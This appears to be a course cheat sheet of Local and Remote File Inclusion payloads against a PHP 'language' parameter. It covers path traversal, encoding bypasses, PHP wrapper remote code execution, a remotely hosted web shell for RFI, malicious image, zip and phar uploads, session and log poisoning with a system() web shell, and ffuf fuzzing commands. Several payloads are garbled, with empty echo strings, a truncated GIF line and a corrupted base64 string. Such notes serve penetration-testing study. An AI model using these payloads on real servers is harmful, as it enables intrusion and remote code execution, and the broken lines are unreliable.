# LFI

../../../../etc/passwd



**Bypass filters with URL encoding:**

\
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

\
**Bypass appended extension with path truncation (obsolete):**\
/index.php?language=non\_existing\_directory/../../../etc/passwd/./././.\[./ REPEATED \~2048&#x20;times]

\
**Bypass appended extension with null byte (obsolete):**\
/index.php?language=..//etc/passwd%00<br>

**Read PHP with base64 filter:**\
/index.php?language=php://filter/read=convert.base64-encode/resource=config<br>

**Remote Code Execution**<br>

**PHP Wrappers**<br>

**RCE with data wrapper:**\
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR@VUWyJjbWQiXSk7ID8%2BCg%3D%3D\&cmd=id\


**FILE&#x20;INCLUSION**\
\
**RCE with input wrapper:**\
curl -s -X POST --data '' "http://\<SERVER\_IP>:/index.php?language=php://input\&cmd=id"<br>

**RCE with expect wrapper:**\
curl -s "http://\<SERVER\_IP>:/index.php?language=expect://id"<br>

**RFI**&#x20;**Host web shell:**\
echo '' >shell.php && python3 -m http.server\<LISTENING\_PORT>

\
**Include remote PHP web shell:**\
/index.php?language=http://\<OUR\_IP>:/shell.php\&cmd=id<br>

**LFI + Upload**<br>

**Create malicious image:**\
echo 'GIF8\
shell.gif\
\
**FILE**\
**INCLUSION**\
\
**RCE with malicious uploaded image:**\
/index.php?language=./profile\_images/shell.gif\&cmd=i

\
**Create malicious zip archive 'as jpg':**\
echo ''shell.php && zip shell.jpg shell.php

\
**RCE with malicious uploaded zip:**\
/index.php?language=zip://shell.zip%23shell.php\&cmd=id

\
**Create malicious phar 'as jpg':**\
php --define phar.readonly=0 shell.php && mv&#x20;shell.phar shell.jpg

\
**RCE with malicious uploaded phar:**\
/index.php?language=phar://./profile\_images/shell.jpg%2Fshell.txt\&cmd=id

\
**Log Poisoning**\
**Read PHP session parameters:**\
/index.php?language=/var/lib/php/sessions/sess\_nhhv8i0o6ua4g88bkdl9u1fdsd

\
**Poison PHP session with web shell:**\
/index.php?language=%3C%3Fphp%20system%28%24\_GET%5B%22cmd%22%5D%29%3B%3F%3E

\
**RCE through poisoned PHP session:**\
/index.php?language=/var/lib/php/sessions/sess\_nhhv8i0o6ua4g88bkdl9u1fdsd\&cmd=id

\
**Poison server log:**\
curl -s "http://\<SERVER\_IP>:/index.php" -A ''

\
**RCE through poisoned PHP session:**\
/index.php?language=/var/log/apache2/access.log\&cmd=id

\
**Fuzz page parameters:**\
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u\
'http://\<SERVER\_IP>:/index.php?FUZZ=value' -fs 2287\
\
**Fuzz LFI payloads:**\
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://\<SERVER\_IP>:/index.php?language=FUZZ' -fs 2287

\
**Fuzz webroot path:**\
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u'http://\<SERVER\_IP>:/index.php?language=../../../../FUZZ/index.php' -fs 2287

\
**Fuzz server configurations:**\
ffuf -w ./LFI-WordList-Linux: FUZZ -u'http://\<SERVER\_IP>:/index.php?language=.././FUZZ' -fs 2287

\
**LFI Wordlists**\
LFI-Jhaddix.txt
